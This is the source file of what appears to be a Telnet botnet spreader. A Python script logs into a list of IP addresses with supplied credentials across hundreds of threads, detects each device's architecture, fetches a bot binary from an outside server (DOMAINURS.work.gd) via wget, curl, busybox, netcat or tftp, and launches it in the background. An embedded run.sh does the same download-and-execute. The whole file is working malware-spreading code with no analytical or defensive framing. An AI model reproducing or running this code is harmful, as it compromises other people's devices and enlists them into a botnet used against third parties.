import telnetlib
import time
import re
import sys
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

CONN_TIMEOUT = 8
CMD_TIMEOUT  = 8
MAX_WORKERS  = 300

RUN_SH_SCRIPT = '''#!/bin/sh
# run.sh – architecture-aware apex4 bot launcher (busybox/wget/curl fallback)
SERVER="http://DOMAINURS.work.gd"

# -------- architecture detection --------
ARCH=$(uname -m 2>/dev/null || echo "unknown")
case "$ARCH" in
    x86_64|amd64)        PAYLOAD="x86_64" ;;
    i686|i386|i486|i586) PAYLOAD="x86" ;;
    armv7*|armv7l)       PAYLOAD="armv7l" ;;
    armv6*)              PAYLOAD="armv6l" ;;
    armv5*)              PAYLOAD="armv5l" ;;
    armv4*)              PAYLOAD="armv4l" ;;
    aarch64|arm64|armv8*) PAYLOAD="armv7l" ;;
    mips)                PAYLOAD="mips" ;;
    mipsel)              PAYLOAD="mipsel" ;;
    m68k)                PAYLOAD="m68k" ;;
    ppc*|powerpc)        PAYLOAD="powerpc" ;;
    sh4|sh)              PAYLOAD="sh4" ;;
    *)                   PAYLOAD="x86_64" ;;
esac

echo "[*] Arch: $ARCH -> $PAYLOAD"

cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /var/tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /

# -------- download helper --------
download() {
    url="$1"; out="$2"
    if command -v wget >/dev/null 2>&1; then wget -q -O "$out" "$url" && return 0; fi
    if command -v curl >/dev/null 2>&1; then curl -s -o "$out" "$url" && return 0; fi
    if command -v busybox >/dev/null 2>&1; then busybox wget -q -O "$out" "$url" && return 0; fi
    if command -v nc >/dev/null 2>&1; then
        echo -e "GET /$(basename "$url") HTTP/1.0\\r\\n\\r\\n" | nc "$(echo "$url" | cut -d/ -f3)" 80 > "$out"
        [ -s "$out" ] && return 0
    fi
    return 1
}

# -------- download and run apex4 bot (foreground, tag=vps) --------
PAYLOAD_BIN="./q"
echo "[*] Downloading apex4 bot ($PAYLOAD)..."
if download "$SERVER/$PAYLOAD" "$PAYLOAD_BIN"; then
    chmod +x "$PAYLOAD_BIN"
    echo "[+] Bot saved, launching..."
    (nohup "$PAYLOAD_BIN" vps >/dev/null 2>&1 &) || "$PAYLOAD_BIN" vps >/dev/null 2>&1 &
    echo "[+] Bot launched"
else
    echo "[!] Download failed"
    exit 1
fi

exit 0
'''

# Thread‑safe print
print_lock = Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)

def send_command(tn, cmd, wait=1):
    try:
        tn.write(cmd.encode() + b'\n')
        time.sleep(wait)
        out = tn.read_very_eager().decode('utf-8', errors='ignore')
        return out
    except Exception as e:
        safe_print(f"[!] Command error: {e}")
        return ""

def write_script_via_echo(tn, script_content, remote_path):
    """Write a multi-line script to the target using base64 (safest)."""
    import base64 as _b64
    enc = _b64.b64encode(script_content.encode()).decode()
    # busybox base64 -d / openssl fallback
    cmd = (f"echo {enc} | base64 -d > {remote_path} 2>/dev/null || "
           f"echo {enc} | openssl base64 -d -A > {remote_path}")
    send_command(tn, cmd, wait=2)
    out = send_command(tn, f"wc -c < {remote_path}", wait=1)
    try:
        size = int(re.search(r'\d+', out).group())
        if size > 1000:
            return True
    except:
        pass
    return False

def try_login(host, port, user, password):
    socket.setdefaulttimeout(CONN_TIMEOUT)
    try:
        tn = telnetlib.Telnet(host, port, timeout=CONN_TIMEOUT)
        # optional leading banner/prompt
        tn.read_until(b"login:", timeout=CONN_TIMEOUT)
        tn.write(user.encode() + b'\n')
        resp = tn.read_until(b"Password:", timeout=CONN_TIMEOUT)
        if b"$" in resp or b"#" in resp or b">" in resp:
            # already at a shell (no password needed)
            tn.write(b"echo LOGIN_OK\n")
            time.sleep(0.4)
            if b"LOGIN_OK" in tn.read_very_eager():
                return tn
        tn.write(password.encode() + b'\n')
        time.sleep(0.6)
        tn.write(b"echo LOGIN_OK\n")
        time.sleep(0.6)
        out = tn.read_very_eager()
        if b"LOGIN_OK" in out:
            return tn
        tn.close()
    except Exception:
        pass
    return None

def find_writable_dir(tn):
    for d in ["/tmp", "/var/tmp", "/dev/shm", "/var/run"]:
        out = send_command(tn, f"cd {d} && pwd", wait=0.8)
        if d in out and "not found" not in out.lower():
            return d
    return None

def _arch_from(tn):
    out = send_command(tn, "uname -m", wait=1)
    if "armv7" in out: return "armv7l"
    if "armv6" in out: return "armv6l"
    if "armv5" in out: return "armv5l"
    if "aarch64" in out or "arm64" in out: return "armv7l"
    if "mipsel" in out: return "mipsel"
    if "mips" in out: return "mips"
    if "x86_64" in out or "amd64" in out: return "x86_64"
    if "i686" in out or "i386" in out or "i486" in out or "i586" in out: return "x86"
    return "x86_64"

def exploit_target(host, port, user, password):
    safe_print(f"[*] {host}:{port} {user}:{password}")
    tn = try_login(host, port, user, password)
    if not tn:
        safe_print(f"[-] Login failed {host}:{port}")
        return False

    safe_print(f"[+] Logged in {host}:{port}")

    SERVER = "DOMAINURS.work.gd"
    arch = _arch_from(tn)
    # raw-push port for this arch (nc <host> <port> > q)
    RAW_PORT = {
        "armv7l": "9911", "x86_64": "9912", "x86": "9913",
        "armv6l": "9914", "mips": "9915", "mipsel": "9916",
        "armv5l": "9917", "armv4l": "9918", "aarch64": "9919",
    }.get(arch, "9912")

    # try several writable dirs (short, wrap-safe)
    for d in ["/tmp", "/var/tmp", "/dev/shm", "/var/run"]:
        send_command(tn, f"cd {d}", wait=0.6)

        # multi-method download:
        #  wget / curl / busybox wget  (HTTP)
        #  nc HTTP request             (busybox nc on :80)
        #  nc raw-push                 (no tools: server streams on connect)
        #  tftp
        dl = (
            f"rm -f q; "
            f"wget -O q http://{SERVER}/{arch} 2>/dev/null || "
            f"curl -o q http://{SERVER}/{arch} 2>/dev/null || "
            f"busybox wget -O q http://{SERVER}/{arch} 2>/dev/null || "
            f"(echo -e 'GET /{arch} HTTP/1.0\\r\\nHost: {SERVER}\\r\\n\\r\\n'; sleep 2) | nc {SERVER} 80 > q 2>/dev/null || "
            f"nc {SERVER} {RAW_PORT} > q 2>/dev/null || "
            f"busybox nc {SERVER} {RAW_PORT} > q 2>/dev/null || "
            f"tftp -g -r {arch} -l q {SERVER} 2>/dev/null"
        )
        send_command(tn, dl, wait=6)

        # verify size >= 100000 bytes
        sz = send_command(tn, "wc -c < q 2>/dev/null; ls -l q 2>/dev/null", wait=1)
        ok = False
        nums = re.findall(r'\d+', sz)
        for x in nums:
            if int(x) > 100000:
                ok = True
                break
        if not ok:
            continue

        send_command(tn, "chmod 777 q 2>/dev/null", wait=0.5)
        # launch detached; try several spawn methods
        send_command(tn, "(./q vps >/dev/null 2>&1 &)", wait=1)
        send_command(tn, "nohup ./q vps >/dev/null 2>&1 &", wait=1)
        safe_print(f"[+] infect OK {host} arch={arch} dir={d} size={sz.strip()[:60]}")
        tn.close()
        return True

    safe_print(f"[-] No valid download on {host}:{port} arch={arch}")
    tn.close()
    return False

import re
TARGET_RE = re.compile(r'^([^:]+):(\d+)(?:[\s:]+([^:]+):(.*))?$')

BLACKLIST_FILE = "blacklist.txt"

def load_blacklist():
    try:
        with open(BLACKLIST_FILE) as f:
            return set(l.strip() for l in f if l.strip())
    except FileNotFoundError:
        return set()

def add_blacklist(host):
    try:
        # avoid duplicate entries
        existing = load_blacklist()
        if host in existing:
            return
        with open(BLACKLIST_FILE, "a") as f:
            f.write(host + "\n")
    except Exception:
        pass

def main():
    try:
        with open("real.txt", "r") as f:
            lines = f.readlines()
    except FileNotFoundError:
        safe_print("[-] real.txt not found!")
        sys.exit(1)

    blacklist = load_blacklist()
    targets = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = TARGET_RE.match(line)
        if not m:
            safe_print(f"[-] Skipping malformed line: {line}")
            continue
        ip = m.group(1)
        port = int(m.group(2))
        if ip in blacklist:
            continue
        user = m.group(3) if m.group(3) else "root"
        password = m.group(4) if m.group(4) else ""
        targets.append((ip, port, user, password))

    total = len(targets)
    safe_print(f"[+] Loaded {total} targets (blacklisted {len(blacklist)}). {MAX_WORKERS} workers...\n")

    success = 0
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_target = {
            executor.submit(exploit_target, ip, port, user, password): (ip, port)
            for (ip, port, user, password) in targets
        }
        for future in as_completed(future_to_target):
            ip, port = future_to_target[future]
            try:
                if future.result():
                    success += 1
                else:
                    # remember failures so we stop wasting attempts on them
                    add_blacklist(ip)
            except Exception as e:
                safe_print(f"[!] Exception on {ip}:{port}: {e}")
                add_blacklist(ip)

    safe_print(f"\n[+] Finished. {success}/{total} targets exploited successfully.")

if __name__ == "__main__":
    main()
